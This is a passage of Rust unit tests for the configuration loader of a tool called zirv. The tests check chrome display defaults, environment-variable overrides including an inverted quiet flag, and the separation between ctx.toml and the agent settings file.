        assert!(!cfg.mail.enabled);
        assert_eq!(cfg.mail.max_message_bytes, 512);
        assert_eq!(cfg.mail.max_delivered_bytes, 256);
        assert_eq!(cfg.mail.keep, 5);
    }

    /// `.settings.toml` and `ctx.toml` are deliberately distinct files:
    /// `agents` is `#[serde(skip)]` on `CtxConfig`, so an `[agents]` table
    /// inside `ctx.toml` is unrecognized rather than silently accepted.
    #[test]
    fn agents_in_ctx_toml_is_rejected_so_the_two_files_stay_distinct() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[agents.codex]\nenabled = false\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("[agents] belongs in .settings.toml, not ctx.toml");
        assert!(err.to_string().contains("agents"), "got {err}");
    }

    #[test]
    fn chrome_defaults_are_all_on() {
        let chrome = ChromeConfig::default();
        assert!(chrome.banner, "the launch banner is on by default");
        assert!(chrome.bar, "the status bar is on by default");
        assert!(chrome.events, "the announcement channel is on by default");
    }

    #[test]
    fn chrome_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nbanner = false\nbar = false\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.banner);
        assert!(!cfg.chrome.bar);
        assert!(cfg.chrome.events, "untouched keys keep defaults");

        let env = env_map(&[
            ("ZIRV_CTX_CHROME_BANNER", "false"),
            ("ZIRV_CTX_CHROME_BAR", "false"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.banner);
        assert!(!cfg.chrome.bar);
    }

    /// `ZIRV_CTX_QUIET=true` must turn the announcement channel off, not on:
    /// it is the negation of `chrome.events`, the one entry in `ENV_MAP`
    /// whose meaning is inverted from the key it feeds.
    #[test]
    fn zirv_ctx_quiet_inverts_into_chrome_events() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_QUIET", "true")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.chrome.events,
            "quiet=true must silence the announcement channel"
        );

        let env = env_map(&[("ZIRV_CTX_QUIET", "false")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            cfg.chrome.events,
            "quiet=false must leave the announcement channel on"
        );
    }

    #[test]
    fn a_non_boolean_quiet_value_is_rejected() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_QUIET", "loud")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad bool");
        assert!(err.to_string().contains("ZIRV_CTX_QUIET"), "got {err}");
    }

    /// `[chrome]` is not in `REPO_FORBIDDEN`: unlike `agent_bin` or
    /// `handoff.model`, nothing here names what zirv runs or spends tokens
    /// on, so a repository may configure its own chrome defaults.
    #[test]
    fn a_repository_may_configure_chrome() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[chrome]\nbar = false\n",
        )
        .expect("write");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.chrome.bar);
    }

    #[test]
    fn the_agent_gate_is_loaded_alongside_the_ctx_config() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/.settings.toml"),
            "[agents.codex]\nenabled = false\n",
        )
        .expect("write");
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.agents.is_enabled("codex"));
        assert!(cfg.agents.is_enabled("claude"));
    }
}
